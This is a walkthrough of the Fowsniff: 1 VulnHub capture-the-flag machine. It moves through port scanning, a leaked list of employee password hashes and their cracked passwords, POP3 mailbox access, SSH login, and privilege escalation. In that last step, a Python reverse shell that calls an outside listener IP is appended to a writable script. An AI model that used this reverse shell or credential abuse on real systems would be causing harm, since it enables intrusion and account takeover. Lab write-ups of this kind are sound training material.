# Fowsniff: 1

- **Machine:** Fowsniff: 1
- **Download:** https://www.vulnhub.com/entry/fowsniff-1,262/

![](images/828-1.png)

---

## Setup

- Extract the downloaded archive.

```bash
7z e Fowsniff_CTF_ova.7z
```

- Import the `.ova` file into VirtualBox.
- Click **Finish**.
- Start the virtual machine.

---

# Network Scanning

## Find the Target IP Address

```bash
nmap -sn 192.168.2.0/24
```

![](images/828-2.png)

---

## Full Port Scan

Run a comprehensive Nmap scan to enumerate all open ports, services, operating system details, and default NSE scripts.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.134
```

![](images/828-3.png)

---

## Optional Port Scan

```bash
nmap -v -p- 192.168.2.134
```

```bash
nmap -sC -sV -A 192.168.2.134
```

---

## HTTP Enumeration

This command performs an aggressive scan and runs the `http-enum` NSE script to identify interesting web directories.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.134
```

![](images/828-4.png)

---

# Web Enumeration

Visit the following URLs:

- http://192.168.2.134/
- http://192.168.2.134/robots.txt
- http://192.168.2.134/README.txt
- http://192.168.2.134/images/

---

## Directory Enumeration

Run Gobuster to discover additional directories.

```bash
gobuster dir -u http://192.168.2.134/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

![](images/828-5.png)

---

## Interesting File

Visit:

- http://192.168.2.134/security.txt

![](images/828-6.png)

---

## Search for Public Information

Search for **Fowsniff Corp** and locate the leaked GitHub file.

```text
https://raw.githubusercontent.com/berzerk0/Fowsniff/main/fowsniff.txt
```

![](images/828-7.png)

The file contains employee usernames and password hashes.

```text
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
```

---

## Crack the Password Hashes

Use an online hash lookup service.

```text
https://hashes.com/en/decrypt/hash
```

![](images/828-8.png)

Recovered passwords:

```text
mauer     : mailcall
mustikka  : bilbo101
tegel      : apples01
baksteen   : skyler22
seina      : scoobydoo2
stone      : Not Cracked
mursten    : carp4ever
parede     : orlando12
sciana     : 07011972
```

Only one password remained uncracked.

---

# POP3 Enumeration

Connect to the POP3 service.

```bash
telnet 192.168.2.134 110
```

Authenticate using the recovered credentials.

```text
USER seina
```

```text
PASS scoobydoo2
```

![](images/828-9.png)

---

## Enumerate the Mailbox

List available emails.

```text
LIST
```

![](images/828-10.png)

Retrieve the emails.

```text
RETR 1
```

```text
RETR 2
```

![](images/828-11.png)

![](images/828-12.png)

### Credentials Discovered

```text
Username : baksteen
Password : S1ck3nBluff+secureshell
```

---

# SSH Access

Connect to the target using the recovered credentials.

```bash
ssh baksteen@192.168.2.134
```

![](images/828-13.png)

Successful authentication provides shell access.

---

# Privilege Escalation (Lab)

> **Lab note:** The following steps are intended only for an authorized practice machine such as this VulnHub VM.

After gaining access, enumerate the system. The user **baksteen** belongs to multiple groups, making it worthwhile to search for writable files owned by the **users** group.

![](images/828-14.png)

---

## Find Writable Files

```bash
find / -group users -type f 2>/dev/null
```

![](images/828-15.png)

---

## Review the Script

```bash
cat /opt/cube/cube.sh
```

![](images/828-16.png)

---

## Modify the Script

Open the script for editing.

```bash
nano /opt/cube/cube.sh
```

Append the Python reverse shell payload.

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.219",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
```

![](images/828-17.png)

---

## Start a Listener

```bash
nc -nlvp 443
```

Reconnect to the SSH service.

```bash
ssh baksteen@192.168.2.134
```

![](images/828-18.png)

A root shell is obtained.

![](images/828-19.png)

---

## Retrieve the Flag

Navigate to the root directory.

```bash
cd /root
```

List the files.

```bash
ls
```

Read the flag.

```bash
cat flag.txt
```

![](images/828-20.png)

---

# Impact

- Public information leak exposed employee password hashes.
- Weak passwords allowed credential recovery.
- POP3 mailbox access disclosed additional credentials.
- SSH access provided an initial foothold.
- Writable privileged scripts enabled privilege escalation.
- Full root access to the target system was achieved.

---

# Key Learning

- Search for publicly leaked company information during reconnaissance.
- Password reuse across services can significantly increase attack impact.
- POP3 mailboxes often contain sensitive operational information.
- Always enumerate group memberships after obtaining shell access.
- Writable scripts executed by privileged users can lead to privilege escalation.

---

# Summary

The assessment began with web enumeration and OSINT, revealing a leaked file containing employee password hashes. Several passwords were successfully recovered and used to access a POP3 mailbox, where additional SSH credentials were discovered. After gaining SSH access as **baksteen**, system enumeration identified a writable script executed with elevated privileges. Modifying the script resulted in a root shell, demonstrating the risk of weak credentials combined with insecure privilege management.